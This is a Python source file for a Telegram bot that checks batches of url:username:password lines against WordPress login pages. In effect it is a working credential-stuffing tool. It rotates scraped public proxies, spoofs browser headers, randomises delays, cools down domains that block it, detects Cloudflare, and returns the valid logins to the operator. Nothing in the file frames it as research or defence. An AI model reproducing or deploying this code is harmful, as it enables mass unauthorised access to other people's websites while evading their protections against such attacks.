import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
import random
import time
from datetime import datetime
from aiohttp_socks import ProxyConnector

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message

# ============ CONFIG ============

API_ID = int(os.environ.get("API_ID", "0") or "0")
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMINS = os.environ.get("ADMINS", "")
LEGACY_PROXIES = os.environ.get("PROXIES", "")
MIN_DELAY = float(os.environ.get("MIN_DELAY", "15"))
MAX_DELAY = float(os.environ.get("MAX_DELAY", "45"))
AUTO_REFRESH_PROXIES = os.environ.get("AUTO_REFRESH_PROXIES", "true").lower() == "true"

ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# ============ FLASK SERVER ============

flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot running", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ PROXY MANAGER ============

class ProxyManager:
    def __init__(self):
        self.working_proxies = []
        self.last_refresh = None
        self.proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&limit=50",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        ]
        self._lock = threading.Lock()
        self._load_existing()
        if AUTO_REFRESH_PROXIES:
            self.start_auto_refresh()
    
    def _load_existing(self):
        try:
            if os.path.exists("working_proxies.txt"):
                with open("working_proxies.txt", 'r') as f:
                    self.working_proxies = [p.strip() for p in f if p.strip()]
                logger.info(f"Loaded {len(self.working_proxies)} existing proxies")
        except Exception as e:
            logger.warning(f"Could not load proxies: {e}")
    
    def get_proxies(self):
        with self._lock:
            return self.working_proxies.copy()
    
    def get_random_proxy(self):
        proxies = self.get_proxies()
        if proxies:
            return random.choice(proxies)
        # Fallback to legacy
        if LEGACY_PROXIES:
            legacy = [p for p in LEGACY_PROXIES.split(',') if p.strip()]
            return random.choice(legacy) if legacy else None
        return None
    
    def fetch_proxies(self):
        """Fetch from all sources"""
        import requests
        all_proxies = []
        
        for url in self.proxy_sources:
            try:
                response = requests.get(url, timeout=15)
                if response.status_code == 200:
                    for line in response.text.strip().split('\n'):
                        line = line.strip()
                        if ':' in line and not line.startswith('#'):
                            proxy = line.split('@')[-1] if '@' in line else line
                            if not proxy.startswith('http'):
                                proxy = f"http://{proxy}"
                            all_proxies.append(proxy)
            except Exception as e:
                logger.warning(f"Source failed: {url[:30]}... - {e}")
        
        # Remove duplicates
        seen = set()
        unique = []
        for p in all_proxies:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        
        logger.info(f"Fetched {len(unique)} unique proxies")
        return unique[:100]  # Limit to 100
    
    async def check_proxy(self, proxy):
        """Check if proxy works"""
        try:
            connector = ProxyConnector.from_url(proxy)
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get("http://httpbin.org/ip") as resp:
                    if resp.status == 200:
                        return (proxy, True)
        except:
            pass
        return (proxy, False)
    
    async def verify_proxies(self, proxies):
        """Check which proxies work"""
        tasks = [self.check_proxy(p) for p in proxies[:30]]  # Check top 30
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        working = []
        for r in results:
            if isinstance(r, tuple) and r[1]:
                working.append(r[0])
        
        return working
    
    def refresh(self):
        """Manual refresh"""
        logger.info("Refreshing proxies...")
        
        try:
            # Fetch
            all_proxies = self.fetch_proxies()
            if len(all_proxies) < 10:
                logger.warning("Too few proxies fetched")
                return False
            
            # Verify
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            working = loop.run_until_complete(self.verify_proxies(all_proxies))
            loop.close()
            
            if len(working) < 3:
                logger.warning(f"Only {len(working)} working, keeping old")
                return False
            
            # Update
            with self._lock:
                self.working_proxies = working
                self.last_refresh = datetime.now()
            
            # Save
            with open("working_proxies.txt", 'w') as f:
                for p in working:
                    f.write(f"{p}\n")
            
            logger.info(f"✅ {len(working)} working proxies ready")
            return True
            
        except Exception as e:
            logger.error(f"Refresh failed: {e}")
            return False
    
    def _auto_refresh_loop(self):
        """Background refresh every 30 min"""
        while True:
            self.refresh()
            time.sleep(1800)  # 30 minutes
    
    def start_auto_refresh(self):
        thread = threading.Thread(target=self._auto_refresh_loop, daemon=True)
        thread.start()
        logger.info("Auto proxy refresh started")

# Global proxy manager
proxy_manager = ProxyManager()

def get_random_proxy():
    return proxy_manager.get_random_proxy()

# ============ ANTI-DETECTION HEADERS ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
]

FAILED_DOMAINS = {}

def get_random_headers():
    ua = random.choice(USER_AGENTS)
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }

def is_domain_cooled_down(domain):
    if domain in FAILED_DOMAINS:
        if time.time() - FAILED_DOMAINS[domain] < 300:
            return True
    return False

def mark_domain_failed(domain):
    FAILED_DOMAINS[domain] = time.time()

# ============ PARSER ============

def parse_credential_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url_part = parts[0]
    remaining = ':'.join(parts[1:])
    
    user_pass = remaining.rsplit(':', 1)
    if len(user_pass) != 2:
        return None
    
    username = user_pass[0]
    password = user_pass[1]
    url = clean_url(url_part)
    
    return (url, username, password)

def clean_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https://https://', 'https://', url)
    url = re.sub(r'^http://http://', 'http://', url)
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # WordPress paths
    if '/wp-login.php' in url:
        url = url.split('?')[0]
    elif '/password' in url:
        url = url.split('/password')[0] + '/wp-login.php'
    elif '/sign_up' in url:
        url = url.split('/sign_up')[0] + '/wp-login.php'
    elif '/wp-login' not in url:
        url = url.rstrip('/') + '/wp-login.php'
    
    return url

# ============ SMART LOGIN CHECKER ============

async def check_login_smart(login_url, username, password, max_retries=3):
    """Smart checker with proxy rotation and anti-detection"""
    domain = login_url.split('/')[2]
    
    if is_domain_cooled_down(domain):
        await asyncio.sleep(60)
    
    proxy = get_random_proxy()
    
    # Create connector
    if proxy:
        try:
            connector = ProxyConnector.from_url(proxy)
            logger.info(f"Using proxy: {proxy.split('@')[1] if '@' in proxy else proxy[:30]}...")
        except:
            connector = aiohttp.TCPConnector(limit=5, ssl=False)
            logger.info("Using direct connection")
    else:
        connector = aiohttp.TCPConnector(limit=5, ssl=False)
        logger.info("No proxy available")
    
    timeout = aiohttp.ClientTimeout(total=45, connect=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        
        for attempt in range(max_retries):
            try:
                # Random delay (CRITICAL for anti-block)
                delay = random.uniform(MIN_DELAY, MAX_DELAY)
                if attempt > 0:
                    delay += random.uniform(5, 15)
                logger.info(f"Waiting {delay:.1f}s...")
                await asyncio.sleep(delay)
                
                headers = get_random_headers()
                headers['Referer'] = login_url
                headers['Origin'] = f"https://{domain}"
                
                # Step 1: GET login page
                async with session.get(login_url, headers=headers, allow_redirects=True) as get_resp:
                    
                    text = await get_resp.text()
                    status = get_resp.status
                    
                    # Handle blocks
                    if status == 403:
                        logger.warning(f"403 Blocked on {domain}")
                        mark_domain_failed(domain)
                        return (None, {'error': '403 Blocked', 'retry_after': 300})
                    
                    if status == 429:
                        retry_after = int(get_resp.headers.get('Retry-After', 120))
                        logger.warning(f"429 Rate limited, retry after {retry_after}s")
                        mark_domain_failed(domain)
                        await asyncio.sleep(retry_after)
                        continue
                    
                    # Check Cloudflare
                    cf_indicators = ['cf-browser-verification', 'Checking your browser', 'Just a moment', 'cf-ray', '__cf_bm']
                    if any(x in text for x in cf_indicators):
                        logger.warning(f"Cloudflare on {domain}")
                        mark_domain_failed(domain)
                        return (None, {'error': 'Cloudflare', 'retry_after': 600})
                    
                    # Build payload
                    payload = {
                        'log': username,
                        'pwd': password,
                        'rememberme': 'forever',
                        'wp-submit': 'Log In',
                        'redirect_to': login_url.replace('wp-login.php', 'wp-admin/'),
                        'testcookie': '1'
                    }
                    
                    # Extract hidden fields
                    hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', text, re.I)
                    for name, value in hidden:
                        if name and name not in payload:
                            payload[name] = value
                
                # Human-like delay before submit
                await asyncio.sleep(random.uniform(2, 5))
                
                # Step 2: POST login
                post_headers = headers.copy()
                post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                post_headers['Referer'] = login_url
                
                async with session.post(login_url, data=payload, headers=post_headers, allow_redirects=True) as resp:
                    
                    final_url = str(resp.url)
                    text = await resp.text()
                    status = resp.status
                    
                    # Get cookies
                    cookies = [c.key for c in session.cookie_jar]
                    
                    result = {
                        'status': status,
                        'final_url': final_url,
                        'cookies': cookies[:5],
                    }
                    
                    # ========== SUCCESS CHECKS ==========
                    
                    # 1. WordPress logged_in cookie
                    wp_cookies = [c for c in cookies if 'wordpress_logged_in' in c]
                    if wp_cookies:
                        return (True, {**result, 'reason': 'WP logged_in cookie', 'cookie': wp_cookies[0]})
                    
                    # 2. Redirected to wp-admin
                    if '/wp-admin' in final_url and 'wp-login' not in final_url:
                        return (True, {**result, 'reason': 'Redirected to wp-admin'})
                    
                    # 3. Auth cookies present
                    auth_cookies = [c for c in cookies if 'wordpress_' in c]
                    if auth_cookies and 'login' not in final_url:
                        return (True, {**result, 'reason': 'WP auth cookies', 'cookies': auth_cookies})
                    
                    # ========== FAILURE CHECKS ==========
                    
                    text_lower = text.lower()
                    
                    if any(x in text_lower for x in ['incorrect password', 'invalid password']):
                        return (False, {**result, 'reason': 'Incorrect password'})
                    
                    if any(x in text_lower for x in ['invalid username', 'unknown username']):
                        return (False, {**result, 'reason': 'Invalid username'})
                    
                    if 'login failed' in text_lower:
                        return (False, {**result, 'reason': 'Login failed'})
                    
                    # 2FA check
                    if any(x in text_lower for x in ['two-factor', '2fa', 'authentication code']):
                        return (True, {**result, 'reason': '2FA required - Valid credentials', 'needs_2fa': True})
                    
                    # Captcha check
                    if any(x in text_lower for x in ['captcha', 'recaptcha']):
                        return (None, {**result, 'error': 'Captcha required'})
                    
                    # Unknown
                    return (None, {**result, 'error': 'Unknown response'})
                    
            except asyncio.TimeoutError:
                logger.warning(f"Timeout attempt {attempt + 1}")
                if attempt == max_retries - 1:
                    return (None, {'error': 'Timeout'})
                await asyncio.sleep(random.uniform(10, 20))
                
            except Exception as e:
                logger.error(f"Error attempt {attempt + 1}: {str(e)[:50]}")
                if attempt == max_retries - 1:
                    return (None, {'error': str(e)[:100]})
                await asyncio.sleep(random.uniform(5, 10))
        
        return (None, {'error': 'All retries failed'})

# ============ BATCH PROCESSING ============

async def process_batch(credentials, progress_callback=None):
    """Process with rate limiting"""
    results = {'valid': [], 'invalid': [], 'error': [], 'total': len(credentials)}
    
    for i, (url, username, password) in enumerate(credentials):
        try:
            if progress_callback:
                await progress_callback(i + 1, len(credentials), url, username)
            
            is_valid, details = await check_login_smart(url, username, password)
            
            line = f"{url}:{username}:{password}"
            
            if is_valid is True:
                results['valid'].append({'line': line, 'details': details})
            elif is_valid is False:
                results['invalid'].append({'line': line, 'details': details})
            else:
                results['error'].append({'line': line, 'details': details})
                
        except Exception as e:
            logger.error(f"Error: {e}")
            results['error'].append({
                'line': f"{url}:{username}:{password}",
                'details': {'error': str(e)}
            })
    
    return results

# ============ TELEGRAM BOT ============

bot = Client("wp_checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start"))
async def start_handler(client: Client, message: Message):
    user_id = message.from_user.id
    
    welcome = f"""👋 **WP Login Checker Bot**

**Your ID:** `{user_id}`

**Commands:**
• `/check <url> <user> <pass>` - Check single
• `/checkfile` - Upload txt file
• `/status` - Bot status
• `/refreshproxies` - Refresh proxies

**File Format:**https://site.com/wp-login.php:admin:password123
https://site2.com/login:user@email.com

Add `{user_id}` to ADMINS to use."""
    
    await message.reply_text(welcome)

@bot.on_message(filters.command("status"))
async def status_handler(client: Client, message: Message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ Not authorized!")
        return
    
    proxies = proxy_manager.get_proxies()
    status = f"""📊 **Status**

✅ Bot: Online
🔄 Auto Refresh: {'On' if AUTO_REFRESH_PROXIES else 'Off'}
📡 Working Proxies: {len(proxies)}
⏱️ Delay: {MIN_DELAY}s - {MAX_DELAY}s
🕐 Last Refresh: {proxy_manager.last_refresh.strftime('%H:%M:%S') if proxy_manager.last_refresh else 'Never'}

**Anti-Block Features:**
• Proxy rotation every request
• Random delays 15-45s
• Realistic browser headers
• Domain cooldown on blocks
• Cloudflare detection"""
    
    await message.reply_text(status)

@bot.on_message(filters.command("refreshproxies"))
async def refresh_handler(client: Client, message: Message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ Not authorized!")
        return
    
    status = await message.reply_text("🔄 Refreshing proxies... (2-3 min)")
    
    success = proxy_manager.refresh()
    
    if success:
        await status.edit_text(f"✅ Refreshed! {len(proxy_manager.get_proxies())} working proxies")
    else:
        await status.edit_text("⚠️ Refresh failed, using existing proxies")

@bot.on_message(filters.command("check"))
async def check_single_handler(client: Client, message: Message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ Not authorized!")
        return
    
    args = message.text.split()[1:]
    if len(args) < 3:
        await message.reply_text("❌ Usage: `/check <url> <user> <pass>`")
        return
    
    url = clean_url(args[0])
    username = args[1]
    password = ' '.join(args[2:])
    
    status = await message.reply_text(f"⏳ Checking `{username}`...")
    
    try:
        is_valid, details = await check_login_smart(url, username, password)
        
        if is_valid is True:
            result = f"""✅ **VALID**

🔗 `{url}`
👤 `{username}`
🔑 `{password}`
📋 {details.get('reason', 'Success')}"""
            if details.get('needs_2fa'):
                result += "\n⚠️ 2FA Required"
                
        elif is_valid is False:
            result = f"""❌ **INVALID**

🔗 `{url}`
👤 `{username}`
📋 {details.get('reason', 'Failed')}"""
            
        else:
            result = f"""⚠️ **ERROR**

🔗 `{url}`
👤 `{username}`
❌ {details.get('error', 'Unknown')}
⏱️ Retry: {details.get('retry_after', 'N/A')}s"""
        
        await status.edit_text(result)
        
    except Exception as e:
        await status.edit_text(f"❌ Error: `{str(e)[:200]}`")

@bot.on_message(filters.document & filters.private)
async def file_handler(client: Client, message: Message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ Not authorized!")
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("❌ Upload .txt file only!")
        return
    
    if message.document.file_size > 5 * 1024 * 1024:
        await message.reply_text("❌ Max 5MB file!")
        return
    
    status = await message.reply_text("📥 Downloading...")
    
    try:
        file_path = await message.download()
        
        # Parse
        credentials = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                parsed = parse_credential_line(line)
                if parsed:
                    credentials.append(parsed)
        
        if not credentials:
            await status.edit_text("❌ No valid credentials found!")
            os.remove(file_path)
            return
        
        total = len(credentials)
        await status.edit_text(f"🔍 Found {total} credentials. Starting...")
        
        # Progress
        async def progress(current, total, url, username):
            if current % 3 == 0:
                try:
                    await status.edit_text(
                        f"🔍 {current}/{total}\n"
                        f"Current: `{username[:20]}`..."
                    )
                except:
                    pass
        
        # Process
        start = time.time()
        results = await process_batch(credentials, progress)
        elapsed = time.time() - start
        
        # Save valid
        valid_file = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(valid_file, 'w') as f:
            for item in results['valid']:
                f.write(item['line'] + '\n')
        
        # Summary
        summary = f"""✅ **Complete!**

📊 Total: {total}
✅ Valid: {len(results['valid'])}
❌ Invalid: {len(results['invalid'])}
⚠️ Errors: {len(results['error'])}
⏱️ Time: {elapsed:.0f}s ({elapsed/total:.1f}s per check)

📎 Valid credentials below:"""
        
        await status.edit_text(summary)
        await message.reply_document(valid_file, caption="✅ Valid logins")
        
        # Cleanup
        os.remove(file_path)
        os.remove(valid_file)
        
    except Exception as e:
        logger.error(f"File error: {e}")
        await status.edit_text(f"❌ Error: `{str(e)[:200]}`")

# ============ MAIN ============

if __name__ == "__main__":
    # Start Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logger.info("Flask started")
    
    # Start bot
    logger.info("Starting bot...")
    bot.run()
